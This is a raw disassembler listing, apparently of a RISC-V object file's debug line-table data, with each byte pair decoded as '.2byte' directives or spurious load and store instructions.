    1134:	0004                	.2byte	0x4
    1136:	0501                	.2byte	0x501
    1138:	030a                	.2byte	0x30a
    113a:	097f 000c 0501 030f 	.byte	0x7f, 0x09, 0x0c, 0x00, 0x01, 0x05, 0x0f, 0x03, 0x00, 0x09
    1142:	0900 
    1144:	0008                	.2byte	0x8
    1146:	0501                	.2byte	0x501
    1148:	09030307          	.4byte	0x9030307
    114c:	000c                	.2byte	0xc
    114e:	0501                	.2byte	0x501
    1150:	0306                	.2byte	0x306
    1152:	0900                	.2byte	0x900
    1154:	0008                	.2byte	0x8
    1156:	0501                	.2byte	0x501
    1158:	0016                	.2byte	0x16
    115a:	0402                	.2byte	0x402
    115c:	0301                	.2byte	0x301
    115e:	0900                	.2byte	0x900
    1160:	000c                	.2byte	0xc
    1162:	0501                	.2byte	0x501
    1164:	04020013          	add	zero,tp,64 # 40 <buf.4>
    1168:	0301                	.2byte	0x301
    116a:	0900                	.2byte	0x900
    116c:	0008                	.2byte	0x8
    116e:	0501                	.2byte	0x501
    1170:	030c                	.2byte	0x30c
    1172:	0901                	.2byte	0x901
    1174:	000c                	.2byte	0xc
    1176:	0501                	.2byte	0x501
    1178:	0311                	.2byte	0x311
    117a:	0900                	.2byte	0x900
    117c:	0008                	.2byte	0x8
    117e:	0501                	.2byte	0x501
    1180:	030a                	.2byte	0x30a
    1182:	0900                	.2byte	0x900
    1184:	0014                	.2byte	0x14
    1186:	0501                	.2byte	0x501
    1188:	0308                	.2byte	0x308
    118a:	0901                	.2byte	0x901
    118c:	0004                	.2byte	0x4
    118e:	0501                	.2byte	0x501
    1190:	0309                	.2byte	0x309
    1192:	000c0903          	lb	s2,0(s8)
    1196:	0301                	.2byte	0x301
    1198:	0901                	.2byte	0x901
    119a:	0004                	.2byte	0x4
    119c:	0501                	.2byte	0x501
    119e:	0310                	.2byte	0x310
    11a0:	0901                	.2byte	0x901
    11a2:	0018                	.2byte	0x18
    11a4:	0501                	.2byte	0x501
    11a6:	030c                	.2byte	0x30c
    11a8:	0900                	.2byte	0x900
    11aa:	000c                	.2byte	0xc
    11ac:	0501                	.2byte	0x501
    11ae:	09000313          	li	t1,144
    11b2:	0008                	.2byte	0x8
    11b4:	0501                	.2byte	0x501
    11b6:	0309                	.2byte	0x309
    11b8:	0900                	.2byte	0x900
    11ba:	000c                	.2byte	0xc
    11bc:	0501                	.2byte	0x501
    11be:	030a                	.2byte	0x30a
    11c0:	097e                	.2byte	0x97e
    11c2:	000c                	.2byte	0xc
    11c4:	0501                	.2byte	0x501
    11c6:	0316                	.2byte	0x316
    11c8:	0905                	.2byte	0x905
    11ca:	000c                	.2byte	0xc
    11cc:	0001                	.2byte	0x1
    11ce:	0402                	.2byte	0x402
    11d0:	0601                	.2byte	0x601
    11d2:	0c090003          	lb	zero,192(s2)
    11d6:	0100                	.2byte	0x100
    11d8:	0200                	.2byte	0x200
    11da:	0204                	.2byte	0x204
    11dc:	0c090003          	lb	zero,192(s2)
    11e0:	0100                	.2byte	0x100
    11e2:	0105                	.2byte	0x105
    11e4:	0200                	.2byte	0x200
    11e6:	0504                	.2byte	0x504
    11e8:	0306                	.2byte	0x306
    11ea:	0901                	.2byte	0x901
    11ec:	0004                	.2byte	0x4
    11ee:	0901                	.2byte	0x901
    11f0:	0010                	.2byte	0x10
    11f2:	0100                	.2byte	0x100
    11f4:	6501                	.2byte	0x6501
    11f6:	0001                	.2byte	0x1
    11f8:	0500                	.2byte	0x500
    11fa:	0800                	.2byte	0x800
    11fc:	4900                	.2byte	0x4900
    11fe:	0000                	.2byte	0x0
    1200:	0100                	.2byte	0x100
    1202:	0101                	.2byte	0x101
    1204:	000d0efb          	.4byte	0xd0efb
    1208:	0101                	.2byte	0x101
    120a:	0101                	.2byte	0x101
    120c:	0000                	.2byte	0x0
    120e:	0100                	.2byte	0x100
    1210:	0000                	.2byte	0x0
    1212:	0101                	.2byte	0x101
    1214:	1f01                	.2byte	0x1f01
    1216:	0005                	.2byte	0x5
    1218:	0000                	.2byte	0x0
    121a:	3600                	.2byte	0x3600
    121c:	0000                	.2byte	0x0
    121e:	4c00                	.2byte	0x4c00
    1220:	0000                	.2byte	0x0
    1222:	8b00                	.2byte	0x8b00
    1224:	0000                	.2byte	0x0
    1226:	f000                	.2byte	0xf000
    1228:	0000                	.2byte	0x0
    122a:	0200                	.2byte	0x200
    122c:	1f01                	.2byte	0x1f01
    122e:	0f02                	.2byte	0xf02
    1230:	9f05                	.2byte	0x9f05
    1232:	0001                	.2byte	0x1
    1234:	0100                	.2byte	0x100
    1236:	019f 0000 c601      	.byte	0x9f, 0x01, 0x00, 0x00, 0x01, 0xc6
    123c:	0000                	.2byte	0x0
    123e:	0200                	.2byte	0x200
    1240:	000000d7          	.4byte	0xd7
    1244:	0001a403          	lw	s0,0(gp)
    1248:	0400                	.2byte	0x400
    124a:	2405                	.2byte	0x2405
    124c:	0900                	.2byte	0x900
    124e:	0c02                	.2byte	0xc02
    1250:	0025                	.2byte	0x25
    1252:	0080                	.2byte	0x80
    1254:	0000                	.2byte	0x0
    1256:	0300                	.2byte	0x300
    1258:	1c050123          	sb	zero,450(a0)
    125c:	10090103          	lb	sp,256(s2)
    1260:	0100                	.2byte	0x100
    1262:	1705                	.2byte	0x1705
    1264:	08090003          	lb	zero,128(s2)
    1268:	0100                	.2byte	0x100
    126a:	0e05                	.2byte	0xe05
    126c:	08090003          	lb	zero,128(s2)
    1270:	0100                	.2byte	0x100
    1272:	0f05                	.2byte	0xf05
    1274:	08090103          	lb	sp,128(s2)
    1278:	0100                	.2byte	0x100
    127a:	1c05                	.2byte	0x1c05
    127c:	08090003          	lb	zero,128(s2)
    1280:	0100                	.2byte	0x100
    1282:	1505                	.2byte	0x1505
    1284:	08090003          	lb	zero,128(s2)
    1288:	0100                	.2byte	0x100
    128a:	0105                	.2byte	0x105
    128c:	04090103          	lb	sp,64(s2)
    1290:	0100                	.2byte	0x100
    1292:	10090303          	lb	t1,256(s2)
    1296:	0100                	.2byte	0x100
    1298:	2205                	.2byte	0x2205
    129a:	0c090303          	lb	t1,192(s2)
    129e:	0100                	.2byte	0x100
    12a0:	2c05                	.2byte	0x2c05
    12a2:	10090003          	lb	zero,256(s2)
    12a6:	0100                	.2byte	0x100
    12a8:	2005                	.2byte	0x2005
    12aa:	04090003          	lb	zero,64(s2)
    12ae:	0100                	.2byte	0x100
    12b0:	0c090303          	lb	t1,192(s2)
    12b4:	0100                	.2byte	0x100
    12b6:	1f05                	.2byte	0x1f05
    12b8:	1c090303          	lb	t1,448(s2)
    12bc:	0100                	.2byte	0x100
    12be:	0a05                	.2byte	0xa05
    12c0:	10090003          	lb	zero,256(s2)
    12c4:	0100                	.2byte	0x100
    12c6:	3905                	.2byte	0x3905
    12c8:	10090003          	lb	zero,256(s2)
    12cc:	0100                	.2byte	0x100
    12ce:	1d05                	.2byte	0x1d05
    12d0:	04090003          	lb	zero,64(s2)
    12d4:	0100                	.2byte	0x100
    12d6:	1f05                	.2byte	0x1f05
    12d8:	18090303          	lb	t1,384(s2)
    12dc:	0100                	.2byte	0x100
    12de:	0a05                	.2byte	0xa05
    12e0:	10090003          	lb	zero,256(s2)
    12e4:	0100                	.2byte	0x100
    12e6:	3005                	.2byte	0x3005
    12e8:	10090003          	lb	zero,256(s2)
    12ec:	0100                	.2byte	0x100
    12ee:	1d05                	.2byte	0x1d05
    12f0:	04090003          	lb	zero,64(s2)
    12f4:	0100                	.2byte	0x100
    12f6:	1605                	.2byte	0x1605
    12f8:	18090103          	lb	sp,384(s2)
    12fc:	0100                	.2byte	0x100
    12fe:	2405                	.2byte	0x2405
    1300:	10090003          	lb	zero,256(s2)
    1304:	0100                	.2byte	0x100
    1306:	1405                	.2byte	0x1405
    1308:	04090003          	lb	zero,64(s2)
    130c:	0100                	.2byte	0x100
    130e:	0f05                	.2byte	0xf05
    1310:	14090403          	lb	s0,320(s2)
    1314:	0100                	.2byte	0x100
    1316:	2805                	.2byte	0x2805
    1318:	08090203          	lb	tp,128(s2)
    131c:	0100                	.2byte	0x100
    131e:	1d05                	.2byte	0x1d05
    1320:	08097f03          	.4byte	0x8097f03
    1324:	0100                	.2byte	0x100
    1326:	2d05                	.2byte	0x2d05
    1328:	08090003          	lb	zero,128(s2)
    132c:	0100                	.2byte	0x100
    132e:	0f05                	.2byte	0xf05
    1330:	04090003          	lb	zero,64(s2)
    1334:	0100                	.2byte	0x100
    1336:	0505                	.2byte	0x505
    1338:	08090303          	lb	t1,128(s2)
    133c:	0100                	.2byte	0x100
    133e:	08090103          	lb	sp,128(s2)
    1342:	0100                	.2byte	0x100
    1344:	0c090b03          	lb	s6,192(s2)
    1348:	0100                	.2byte	0x100
    134a:	04090203          	lb	tp,64(s2)
    134e:	0100                	.2byte	0x100
    1350:	0105                	.2byte	0x105
    1352:	04090103          	lb	sp,64(s2)
    1356:	0100                	.2byte	0x100
    1358:	0c09                	.2byte	0xc09
    135a:	0000                	.2byte	0x0
    135c:	0101                	.2byte	0x101
    135e:	0698                	.2byte	0x698
    1360:	0000                	.2byte	0x0
    1362:	0005                	.2byte	0x5
    1364:	0008                	.2byte	0x8
    1366:	0052                	.2byte	0x52
    1368:	0000                	.2byte	0x0
    136a:	0101                	.2byte	0x101
    136c:	fb01                	.2byte	0xfb01
    136e:	0d0e                	.2byte	0xd0e
    1370:	0100                	.2byte	0x100
    1372:	0101                	.2byte	0x101
    1374:	0001                	.2byte	0x1
    1376:	0000                	.2byte	0x0
    1378:	0001                	.2byte	0x1
    137a:	0100                	.2byte	0x100
    137c:	0101                	.2byte	0x101
    137e:	061f 0000 0000      	.byte	0x1f, 0x06, 0x00, 0x00, 0x00, 0x00
    1384:	0000                	.2byte	0x0
    1386:	0000                	.2byte	0x0
    1388:	00f0                	.2byte	0xf0
    138a:	0000                	.2byte	0x0
    138c:	004c                	.2byte	0x4c
    138e:	0000                	.2byte	0x0
    1390:	0000008b          	.4byte	0x8b
    1394:	00f4                	.2byte	0xf4
    1396:	0000                	.2byte	0x0
    1398:	0102                	.2byte	0x102
    139a:	021f 060f 01df      	.byte	0x1f, 0x02, 0x0f, 0x06, 0xdf, 0x01
    13a0:	0000                	.2byte	0x0
    13a2:	7101                	.2byte	0x7101
    13a4:	0001                	.2byte	0x1
    13a6:	0200                	.2byte	0x200
    13a8:	01df 0000 c600      	.byte	0xdf, 0x01, 0x00, 0x00, 0x00, 0xc6
    13ae:	0000                	.2byte	0x0
    13b0:	0300                	.2byte	0x300
    13b2:	000000d7          	.4byte	0xd7
    13b6:	7804                	.2byte	0x7804
    13b8:	0001                	.2byte	0x1
    13ba:	0500                	.2byte	0x500
    13bc:	0105                	.2byte	0x105
    13be:	0900                	.2byte	0x900
    13c0:	8c02                	.2byte	0x8c02
    13c2:	0026                	.2byte	0x26
    13c4:	0080                	.2byte	0x80
    13c6:	0000                	.2byte	0x0
    13c8:	0300                	.2byte	0x300
    13ca:	0128                	.2byte	0x128
    13cc:	1c090803          	lb	a6,448(s2)
    13d0:	0100                	.2byte	0x100
    13d2:	10090303          	lb	t1,256(s2)
    13d6:	0100                	.2byte	0x100
    13d8:	1c090803          	lb	a6,448(s2)
    13dc:	0100                	.2byte	0x100
    13de:	10090303          	lb	t1,256(s2)
    13e2:	0100                	.2byte	0x100
    13e4:	0a05                	.2byte	0xa05
    13e6:	1c090303          	lb	t1,448(s2)
    13ea:	0100                	.2byte	0x100
    13ec:	0305                	.2byte	0x305
    13ee:	04090003          	lb	zero,64(s2)
    13f2:	0100                	.2byte	0x100
    13f4:	1205                	.2byte	0x1205
    13f6:	04090203          	lb	tp,64(s2)
    13fa:	0100                	.2byte	0x100
    13fc:	0905                	.2byte	0x905
    13fe:	10090003          	lb	zero,256(s2)
    1402:	0100                	.2byte	0x100
    1404:	2005                	.2byte	0x2005
    1406:	08090003          	lb	zero,128(s2)
    140a:	0100                	.2byte	0x100
    140c:	1705                	.2byte	0x1705
    140e:	14090003          	lb	zero,320(s2)
    1412:	0100                	.2byte	0x100
    1414:	1405                	.2byte	0x1405
    1416:	08090103          	lb	sp,128(s2)
    141a:	0100                	.2byte	0x100
    141c:	0905                	.2byte	0x905
    141e:	10090003          	lb	zero,256(s2)
    1422:	0100                	.2byte	0x100
    1424:	2405                	.2byte	0x2405
    1426:	08090003          	lb	zero,128(s2)
    142a:	0100                	.2byte	0x100
    142c:	1905                	.2byte	0x1905
    142e:	14090003          	lb	zero,320(s2)
    1432:	0100                	.2byte	0x100
    1434:	0805                	.2byte	0x805
    1436:	08090103          	lb	sp,128(s2)
    143a:	0100                	.2byte	0x100
    143c:	1b05                	.2byte	0x1b05
    143e:	0200                	.2byte	0x200
    1440:	0104                	.2byte	0x104
    1442:	18090003          	lb	zero,384(s2)
    1446:	0100                	.2byte	0x100
    1448:	0805                	.2byte	0x805
    144a:	10090103          	lb	sp,256(s2)
    144e:	0100                	.2byte	0x100
    1450:	1b05                	.2byte	0x1b05
    1452:	0200                	.2byte	0x200
    1454:	0104                	.2byte	0x104
    1456:	18090003          	lb	zero,384(s2)
    145a:	0100                	.2byte	0x100
    145c:	0200                	.2byte	0x200
    145e:	0204                	.2byte	0x204
    1460:	10097b03          	.4byte	0x10097b03
    1464:	0100                	.2byte	0x100
    1466:	1405                	.2byte	0x1405
    1468:	0200                	.2byte	0x200
    146a:	0104                	.2byte	0x104
    146c:	0c090003          	lb	zero,192(s2)
    1470:	0100                	.2byte	0x100
    1472:	1605                	.2byte	0x1605
    1474:	0200                	.2byte	0x200
    1476:	0104                	.2byte	0x104
    1478:	14090003          	lb	zero,320(s2)
    147c:	0100                	.2byte	0x100
    147e:	1105                	.2byte	0x1105
    1480:	0200                	.2byte	0x200
    1482:	0104                	.2byte	0x104
    1484:	08090003          	lb	zero,128(s2)
    1488:	0100                	.2byte	0x100
    148a:	0d05                	.2byte	0xd05
    148c:	0c090703          	lb	a4,192(s2)
    1490:	0100                	.2byte	0x100
    1492:	0605                	.2byte	0x605
    1494:	0c090003          	lb	zero,192(s2)
    1498:	0100                	.2byte	0x100
    149a:	1905                	.2byte	0x1905
    149c:	0200                	.2byte	0x200
    149e:	0104                	.2byte	0x104
    14a0:	04090003          	lb	zero,64(s2)
    14a4:	0100                	.2byte	0x100
    14a6:	2805                	.2byte	0x2805
    14a8:	0200                	.2byte	0x200
    14aa:	0104                	.2byte	0x104
    14ac:	1c090003          	lb	zero,448(s2)
    14b0:	0100                	.2byte	0x100
    14b2:	1f05                	.2byte	0x1f05
    14b4:	0200                	.2byte	0x200
    14b6:	0104                	.2byte	0x104
    14b8:	14090003          	lb	zero,320(s2)
    14bc:	0100                	.2byte	0x100
    14be:	1205                	.2byte	0x1205
    14c0:	0200                	.2byte	0x200
    14c2:	0104                	.2byte	0x104
    14c4:	04090003          	lb	zero,64(s2)
    14c8:	0100                	.2byte	0x100
    14ca:	0c05                	.2byte	0xc05
    14cc:	08090103          	lb	sp,128(s2)
    14d0:	0100                	.2byte	0x100
    14d2:	0a05                	.2byte	0xa05
    14d4:	08090103          	lb	sp,128(s2)
    14d8:	0100                	.2byte	0x100
    14da:	0105                	.2byte	0x105
    14dc:	04090103          	lb	sp,64(s2)
    14e0:	0100                	.2byte	0x100
    14e2:	10090303          	lb	t1,256(s2)
    14e6:	0100                	.2byte	0x100
    14e8:	0a05                	.2byte	0xa05
    14ea:	1c090303          	lb	t1,448(s2)
    14ee:	0100                	.2byte	0x100
    14f0:	0305                	.2byte	0x305
    14f2:	04090003          	lb	zero,64(s2)
    14f6:	0100                	.2byte	0x100
    14f8:	1505                	.2byte	0x1505
    14fa:	04090203          	lb	tp,64(s2)
    14fe:	0100                	.2byte	0x100
    1500:	0c05                	.2byte	0xc05
    1502:	10090003          	lb	zero,256(s2)
    1506:	0100                	.2byte	0x100
    1508:	2305                	.2byte	0x2305
    150a:	08090003          	lb	zero,128(s2)
    150e:	0100                	.2byte	0x100
    1510:	1a05                	.2byte	0x1a05
    1512:	14090003          	lb	zero,320(s2)
    1516:	0100                	.2byte	0x100
    1518:	1705                	.2byte	0x1705
    151a:	08090103          	lb	sp,128(s2)
    151e:	0100                	.2byte	0x100
    1520:	0c05                	.2byte	0xc05
    1522:	10090003          	lb	zero,256(s2)
    1526:	0100                	.2byte	0x100
    1528:	2705                	.2byte	0x2705
    152a:	08090003          	lb	zero,128(s2)
    152e:	0100                	.2byte	0x100
    1530:	1c05                	.2byte	0x1c05
    1532:	14090003          	lb	zero,320(s2)
    1536:	0100                	.2byte	0x100
    1538:	1205                	.2byte	0x1205
    153a:	08090103          	lb	sp,128(s2)
    153e:	0100                	.2byte	0x100
    1540:	0905                	.2byte	0x905
    1542:	14090003          	lb	zero,320(s2)
    1546:	0100                	.2byte	0x100
    1548:	2205                	.2byte	0x2205
    154a:	04090003          	lb	zero,64(s2)
    154e:	0100                	.2byte	0x100
    1550:	1905                	.2byte	0x1905
    1552:	14090003          	lb	zero,320(s2)
    1556:	0100                	.2byte	0x100
    1558:	0f05                	.2byte	0xf05
    155a:	04090103          	lb	sp,64(s2)
    155e:	0100                	.2byte	0x100
    1560:	0805                	.2byte	0x805
    1562:	14090003          	lb	zero,320(s2)
    1566:	0100                	.2byte	0x100
    1568:	1f05                	.2byte	0x1f05
    156a:	0200                	.2byte	0x200
    156c:	0104                	.2byte	0x104
    156e:	04090003          	lb	zero,64(s2)
    1572:	0100                	.2byte	0x100
    1574:	2105                	.2byte	0x2105
    1576:	0200                	.2byte	0x200
    1578:	0104                	.2byte	0x104
    157a:	0c090003          	lb	zero,192(s2)
    157e:	0100                	.2byte	0x100
    1580:	1b05                	.2byte	0x1b05
    1582:	0200                	.2byte	0x200
    1584:	0204                	.2byte	0x204
    1586:	10097b03          	.4byte	0x10097b03
    158a:	0100                	.2byte	0x100
    158c:	1405                	.2byte	0x1405
    158e:	0200                	.2byte	0x200
    1590:	0104                	.2byte	0x104
    1592:	0c090003          	lb	zero,192(s2)
    1596:	0100                	.2byte	0x100
    1598:	1605                	.2byte	0x1605
    159a:	0200                	.2byte	0x200
    159c:	0104                	.2byte	0x104
    159e:	14090003          	lb	zero,320(s2)
    15a2:	0100                	.2byte	0x100
    15a4:	1105                	.2byte	0x1105
    15a6:	0200                	.2byte	0x200
    15a8:	0104                	.2byte	0x104
    15aa:	08090003          	lb	zero,128(s2)
    15ae:	0100                	.2byte	0x100
    15b0:	0d05                	.2byte	0xd05
    15b2:	0c090703          	lb	a4,192(s2)
    15b6:	0100                	.2byte	0x100
    15b8:	0605                	.2byte	0x605
    15ba:	0c090003          	lb	zero,192(s2)
    15be:	0100                	.2byte	0x100
    15c0:	1905                	.2byte	0x1905
    15c2:	0200                	.2byte	0x200
    15c4:	0104                	.2byte	0x104
    15c6:	04090003          	lb	zero,64(s2)
    15ca:	0100                	.2byte	0x100
    15cc:	2805                	.2byte	0x2805
    15ce:	0200                	.2byte	0x200
    15d0:	0104                	.2byte	0x104
    15d2:	18090003          	lb	zero,384(s2)
    15d6:	0100                	.2byte	0x100
    15d8:	1205                	.2byte	0x1205
    15da:	0200                	.2byte	0x200
    15dc:	0104                	.2byte	0x104
    15de:	18090003          	lb	zero,384(s2)
    15e2:	0100                	.2byte	0x100
    15e4:	0c05                	.2byte	0xc05
    15e6:	08090103          	lb	sp,128(s2)
    15ea:	0100                	.2byte	0x100
    15ec:	0a05                	.2byte	0xa05
    15ee:	08090103          	lb	sp,128(s2)
    15f2:	0100                	.2byte	0x100
    15f4:	0105                	.2byte	0x105
    15f6:	04090103          	lb	sp,64(s2)
    15fa:	0100                	.2byte	0x100
    15fc:	10090303          	lb	t1,256(s2)
    1600:	0100                	.2byte	0x100
    1602:	0305                	.2byte	0x305
    1604:	14090503          	lb	a0,320(s2)
    1608:	0100                	.2byte	0x100
    160a:	1105                	.2byte	0x1105
    160c:	04090203          	lb	tp,64(s2)
    1610:	0100                	.2byte	0x100
    1612:	0f05                	.2byte	0xf05
    1614:	10090003          	lb	zero,256(s2)
    1618:	0100                	.2byte	0x100
    161a:	0705                	.2byte	0x705
    161c:	04090103          	lb	sp,64(s2)
    1620:	0100                	.2byte	0x100
    1622:	3005                	.2byte	0x3005
    1624:	1c090003          	lb	zero,448(s2)
    1628:	0100                	.2byte	0x100
    162a:	0605                	.2byte	0x605
    162c:	0c090003          	lb	zero,192(s2)
    1630:	0100                	.2byte	0x100
    1632:	0b05                	.2byte	0xb05
    1634:	04090203          	lb	tp,64(s2)
    1638:	0100                	.2byte	0x100
    163a:	0c090103          	lb	sp,192(s2)
    163e:	0100                	.2byte	0x100
    1640:	0d05                	.2byte	0xd05
    1642:	14090203          	lb	tp,320(s2)
    1646:	0100                	.2byte	0x100
    1648:	1405                	.2byte	0x1405
    164a:	0200                	.2byte	0x200
    164c:	0104                	.2byte	0x104
    164e:	04090003          	lb	zero,64(s2)
    1652:	0100                	.2byte	0x100
    1654:	0305                	.2byte	0x305
    1656:	18090303          	lb	t1,384(s2)
    165a:	0100                	.2byte	0x100
    165c:	0105                	.2byte	0x105
    165e:	04090103          	lb	sp,64(s2)
    1662:	0100                	.2byte	0x100
    1664:	10090303          	lb	t1,256(s2)
    1668:	0100                	.2byte	0x100
    166a:	1a05                	.2byte	0x1a05
    166c:	10090103          	lb	sp,256(s2)
    1670:	0100                	.2byte	0x100
    1672:	1505                	.2byte	0x1505
    1674:	08090003          	lb	zero,128(s2)
    1678:	0100                	.2byte	0x100
    167a:	0c05                	.2byte	0xc05
    167c:	08090003          	lb	zero,128(s2)
    1680:	0100                	.2byte	0x100
    1682:	0d05                	.2byte	0xd05
    1684:	08090103          	lb	sp,128(s2)
    1688:	0100                	.2byte	0x100
    168a:	1a05                	.2byte	0x1a05
    168c:	08090003          	lb	zero,128(s2)
    1690:	0100                	.2byte	0x100
    1692:	1305                	.2byte	0x1305
    1694:	08090003          	lb	zero,128(s2)
    1698:	0100                	.2byte	0x100
    169a:	0105                	.2byte	0x105
    169c:	04090103          	lb	sp,64(s2)
    16a0:	0100                	.2byte	0x100
    16a2:	10090303          	lb	t1,256(s2)
    16a6:	0100                	.2byte	0x100
    16a8:	1b05                	.2byte	0x1b05
    16aa:	10090103          	lb	sp,256(s2)
    16ae:	0100                	.2byte	0x100
    16b0:	1605                	.2byte	0x1605
    16b2:	08090003          	lb	zero,128(s2)
    16b6:	0100                	.2byte	0x100
    16b8:	0c05                	.2byte	0xc05
    16ba:	08090003          	lb	zero,128(s2)
    16be:	0100                	.2byte	0x100
    16c0:	0d05                	.2byte	0xd05
    16c2:	08090103          	lb	sp,128(s2)
    16c6:	0100                	.2byte	0x100
    16c8:	1c05                	.2byte	0x1c05
    16ca:	08090003          	lb	zero,128(s2)
    16ce:	0100                	.2byte	0x100
    16d0:	1405                	.2byte	0x1405
    16d2:	08090003          	lb	zero,128(s2)
    16d6:	0100                	.2byte	0x100
    16d8:	0105                	.2byte	0x105
    16da:	04090103          	lb	sp,64(s2)
    16de:	0100                	.2byte	0x100
    16e0:	1009                	.2byte	0x1009
    16e2:	0000                	.2byte	0x0
    16e4:	0101                	.2byte	0x101
    16e6:	0204                	.2byte	0x204
    16e8:	2d05                	.2byte	0x2d05
    16ea:	0900                	.2byte	0x900
    16ec:	1002                	.2byte	0x1002
    16ee:	2000                	.2byte	0x2000
    16f0:	0080                	.2byte	0x80
    16f2:	0000                	.2byte	0x0
    16f4:	0300                	.2byte	0x300
    16f6:	3505011b          	addw	sp,a0,848
    16fa:	18090103          	lb	sp,384(s2)
    16fe:	0100                	.2byte	0x100
    1700:	1b05                	.2byte	0x1b05
    1702:	08090003          	lb	zero,128(s2)
    1706:	0100                	.2byte	0x100
    1708:	1705                	.2byte	0x1705
    170a:	04090003          	lb	zero,64(s2)
    170e:	0100                	.2byte	0x100
    1710:	04090103          	lb	sp,64(s2)
    1714:	0100                	.2byte	0x100
    1716:	2305                	.2byte	0x2305
    1718:	08090003          	lb	zero,128(s2)
    171c:	0100                	.2byte	0x100
    171e:	1f05                	.2byte	0x1f05
    1720:	08090203          	lb	tp,128(s2)
    1724:	0100                	.2byte	0x100
    1726:	2905                	.2byte	0x2905
    1728:	08090003          	lb	zero,128(s2)
    172c:	0100                	.2byte	0x100
    172e:	2e05                	.2byte	0x2e05
    1730:	08090003          	lb	zero,128(s2)
    1734:	0100                	.2byte	0x100
    1736:	3605                	.2byte	0x3605
    1738:	0c090003          	lb	zero,192(s2)
    173c:	0100                	.2byte	0x100
    173e:	1705                	.2byte	0x1705
    1740:	04090003          	lb	zero,64(s2)
    1744:	0100                	.2byte	0x100
    1746:	0505                	.2byte	0x505
    1748:	04090103          	lb	sp,64(s2)
    174c:	0100                	.2byte	0x100
    174e:	1105                	.2byte	0x1105
    1750:	2c090c03          	lb	s8,704(s2)
    1754:	0100                	.2byte	0x100
    1756:	0805                	.2byte	0x805
    1758:	04090003          	lb	zero,64(s2)
    175c:	0100                	.2byte	0x100
    175e:	0f05                	.2byte	0xf05
    1760:	08090103          	lb	sp,128(s2)
    1764:	0100                	.2byte	0x100
    1766:	0c05                	.2byte	0xc05
    1768:	04090003          	lb	zero,64(s2)
    176c:	0100                	.2byte	0x100
    176e:	0d05                	.2byte	0xd05
    1770:	08090103          	lb	sp,128(s2)
    1774:	0100                	.2byte	0x100
    1776:	0505                	.2byte	0x505
    1778:	04090603          	lb	a2,64(s2)
    177c:	0100                	.2byte	0x100
    177e:	0905                	.2byte	0x905
    1780:	04097d03          	.4byte	0x4097d03
    1784:	0100                	.2byte	0x100
    1786:	0505                	.2byte	0x505
    1788:	08090303          	lb	t1,128(s2)
    178c:	0100                	.2byte	0x100
    178e:	0105                	.2byte	0x105
    1790:	04090103          	lb	sp,64(s2)
    1794:	0100                	.2byte	0x100
    1796:	1105                	.2byte	0x1105
    1798:	10090203          	lb	tp,256(s2)
    179c:	0100                	.2byte	0x100
    179e:	0505                	.2byte	0x505
    17a0:	10090103          	lb	sp,256(s2)
    17a4:	0100                	.2byte	0x100
    17a6:	0105                	.2byte	0x105
    17a8:	04090703          	lb	a4,64(s2)
    17ac:	0100                	.2byte	0x100
    17ae:	2b05                	.2byte	0x2b05
    17b0:	14090203          	lb	tp,320(s2)
    17b4:	0100                	.2byte	0x100
    17b6:	0805                	.2byte	0x805
    17b8:	18090303          	lb	t1,384(s2)
    17bc:	0100                	.2byte	0x100
    17be:	0905                	.2byte	0x905
    17c0:	08090103          	lb	sp,128(s2)
    17c4:	0100                	.2byte	0x100
    17c6:	0c090203          	lb	tp,192(s2)
    17ca:	0100                	.2byte	0x100
    17cc:	1005                	.2byte	0x1005
    17ce:	08090203          	lb	tp,128(s2)
    17d2:	0100                	.2byte	0x100
    17d4:	0605                	.2byte	0x605
    17d6:	08090203          	lb	tp,128(s2)
    17da:	0100                	.2byte	0x100
    17dc:	0d05                	.2byte	0xd05
    17de:	0c090203          	lb	tp,192(s2)
    17e2:	0100                	.2byte	0x100
    17e4:	0c05                	.2byte	0xc05
    17e6:	10090103          	lb	sp,256(s2)
    17ea:	0100                	.2byte	0x100
    17ec:	0105                	.2byte	0x105
    17ee:	04090103          	lb	sp,64(s2)
    17f2:	0100                	.2byte	0x100
    17f4:	1005                	.2byte	0x1005
    17f6:	14090203          	lb	tp,320(s2)
    17fa:	0100                	.2byte	0x100
    17fc:	0e05                	.2byte	0xe05
    17fe:	10090103          	lb	sp,256(s2)
    1802:	0100                	.2byte	0x100
    1804:	0d05                	.2byte	0xd05
    1806:	10090103          	lb	sp,256(s2)
    180a:	0100                	.2byte	0x100
    180c:	10090103          	lb	sp,256(s2)
    1810:	0100                	.2byte	0x100
    1812:	0505                	.2byte	0x505
    1814:	10090403          	lb	s0,256(s2)
    1818:	0100                	.2byte	0x100
    181a:	0e05                	.2byte	0xe05
    181c:	10090203          	lb	tp,256(s2)
    1820:	0100                	.2byte	0x100
    1822:	0505                	.2byte	0x505
    1824:	08090003          	lb	zero,128(s2)
    1828:	0100                	.2byte	0x100
    182a:	3c05                	.2byte	0x3c05
    182c:	04090103          	lb	sp,64(s2)
    1830:	0100                	.2byte	0x100
    1832:	4405                	.2byte	0x4405
    1834:	10090003          	lb	zero,256(s2)
    1838:	0100                	.2byte	0x100
    183a:	0905                	.2byte	0x905
    183c:	04090003          	lb	zero,64(s2)
    1840:	0100                	.2byte	0x100
    1842:	1205                	.2byte	0x1205
    1844:	24090103          	lb	sp,576(s2)
    1848:	0100                	.2byte	0x100
    184a:	14090103          	lb	sp,320(s2)
    184e:	0100                	.2byte	0x100
    1850:	0905                	.2byte	0x905
    1852:	04090003          	lb	zero,64(s2)
    1856:	0100                	.2byte	0x100
    1858:	1605                	.2byte	0x1605
    185a:	04090303          	lb	t1,64(s2)
    185e:	0100                	.2byte	0x100
    1860:	0d05                	.2byte	0xd05
    1862:	04090003          	lb	zero,64(s2)
    1866:	0100                	.2byte	0x100
    1868:	1105                	.2byte	0x1105
    186a:	0200                	.2byte	0x200
    186c:	0304                	.2byte	0x304
    186e:	04090103          	lb	sp,64(s2)
    1872:	0100                	.2byte	0x100
    1874:	2505                	.2byte	0x2505
    1876:	0200                	.2byte	0x200
    1878:	0304                	.2byte	0x304
    187a:	0c097f03          	.4byte	0xc097f03
    187e:	0100                	.2byte	0x100
    1880:	1f05                	.2byte	0x1f05
    1882:	0200                	.2byte	0x200
    1884:	0104                	.2byte	0x104
    1886:	0c090003          	lb	zero,192(s2)
    188a:	0100                	.2byte	0x100
    188c:	1505                	.2byte	0x1505
    188e:	0200                	.2byte	0x200
    1890:	0204                	.2byte	0x204
    1892:	10090303          	lb	t1,256(s2)
    1896:	0100                	.2byte	0x100
    1898:	0d05                	.2byte	0xd05
    189a:	0200                	.2byte	0x200
    189c:	0204                	.2byte	0x204
    189e:	14090103          	lb	sp,320(s2)
